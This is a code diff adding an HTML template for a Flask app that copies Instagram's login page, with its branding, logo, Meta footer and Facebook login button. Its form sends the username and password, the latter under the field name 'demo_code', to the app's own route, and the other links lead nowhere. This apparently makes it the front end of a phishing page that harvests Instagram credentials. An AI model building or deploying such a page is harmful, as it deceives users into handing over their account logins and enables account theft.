@@ -1,0 +1,284 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <link rel="stylesheet"
+      href="{{ url_for('static', filename='css/style.css') }}">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Log into Instagram</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg-left: #0c0d10;
+      --bg-right: #121212;
+      --input-bg: #1a1a1a;
+      --input-border: #333333;
+      --text-main: #ffffff;
+      --text-muted: #a8a8a8;
+      --btn-blue: #1877f2;
+      --btn-blue-hover: #166fe5;
+      --btn-secondary: #262626;
+      --accent-gradient: linear-gradient(to right, #ff3040, #d600ad);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-right);
+      color: var(--text-main);
+      display: flex;
+      min-height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      width: 100%;
+    }
+
+    /* Left Section */
+    .hero-side {
+      flex: 1.1;
+      background-color: var(--bg-left);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+      text-align: center;
+      border-right: 1px solid #262626;
+    }
+
+    .ig-logo-top {
+      width: 60px;
+      margin-bottom: 40px;
+    }
+
+    .hero-side h1 {
+      font-size: 42px;
+      font-weight: 700;
+      max-width: 500px;
+      margin-bottom: 40px;
+      line-height: 1.2;
+    }
+
+    .hero-side h1 span {
+      background: var(--accent-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .mockup-container {
+      position: relative;
+      width: 320px;
+      height: 400px;
+    }
+
+    /* Simple representation of the overlapping images in your screenshot */
+    .mockup-img {
+      position: absolute;
+      border-radius: 20px;
+      background: #333;
+      border: 4px solid #000;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+    }
+
+    .img-1 { width: 180px; height: 260px; left: 0; bottom: 20px; z-index: 1; transform: rotate(-5deg); }
+    .img-2 { width: 220px; height: 320px; left: 50px; bottom: 0; z-index: 3; }
+    .img-3 { width: 160px; height: 220px; right: 0; top: 20px; z-index: 2; transform: rotate(5deg); }
+    /* Add photos to the three existing image cards */
+.img-1 {
+    background-image: url("/static/css/images/photo1.jpg");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+}
+
+.img-2 {
+    background-image: url("/static/css/images/photo2.jpg");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+}
+
+.img-3 {
+    background-image: url("/static/css/images/photo3.jpg");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+}
+
+    /* Right Section */
+    .form-side {
+      flex: 0.9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+
+    .form-box {
+      width: 100%;
+      max-width: 380px;
+    }
+
+    .form-box h2 {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 24px;
+    }
+
+    .input-field {
+      width: 100%;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 8px;
+      padding: 14px;
+      color: white;
+      font-size: 14px;
+      margin-bottom: 12px;
+      outline: none;
+    }
+
+    .input-field:focus {
+      border-color: #555;
+    }
+
+    .btn-login {
+      width: 100%;
+      background: var(--btn-blue);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .forgot-link {
+      display: block;
+      text-align: center;
+      margin: 20px 0;
+      color: var(--text-main);
+      font-size: 14px;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .fb-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      background: var(--btn-secondary);
+      color: var(--text-main);
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: none;
+      margin-bottom: 12px;
+    }
+
+    .btn-outline {
+      display: block;
+      text-align: center;
+      width: 100%;
+      border: 1px solid var(--input-border);
+      color: var(--text-main);
+      border-radius: 8px;
+      padding: 12px;
+      font-weight: 600;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .meta-footer {
+      margin-top: 40px;
+      text-align: center;
+      color: var(--text-muted);
+      font-size: 13px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+
+    @media (max-width: 860px) {
+      .hero-side { display: none; }
+      .form-side { flex: 1; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <section class="hero-side">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="IG" class="ig-logo-top">
+    <h1>See everyday moments from your <span>close friends.</span></h1>
+    
+    <div class="mockup-container">
+      <div class="mockup-img img-1"></div>
+      <div class="mockup-img img-2"></div>
+      <div class="mockup-img img-3"></div>
+    </div>
+  </section>
+
+  <section class="form-side">
+    <div class="form-box">
+      <h2>Log into Instagram</h2>
+      
+      <form method="POST" action="{{ url_for('index') }}">
+  <input
+    type="text"
+    class="input-field"
+    name="username"
+    placeholder="Mobile number, username, or email"
+    maxlength="64"
+    required
+  >
+
+  <input
+    type="text"
+    class="input-field"
+    name="demo_code"
+    placeholder="Password"
+    maxlength="32"
+    required
+  >
+
+  <button type="submit" class="btn-login">Log in</button>
+</form>
+
+      <a href="#" class="forgot-link">Forgot password?</a>
+
+      <a href="#" class="fb-login">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        Log in with Facebook
+      </a>
+
+      <a href="#" class="btn-outline">Create new account</a>
+
+      <div class="meta-footer">
+    <div class="meta-brand">
+        <img
+    src="{{ url_for('static', filename='css/images/meta-logo.png') }}"
+    alt="Meta Logo"
+    style="width: 18px !important; height: 12px !important; max-width: 18px !important; object-fit: contain; display: inline-block;"
+>
+        <span>Meta</span>
+    </div>
+    </div>
+    </div>
+  </section>
+</div>
+
+</body>
+</html>
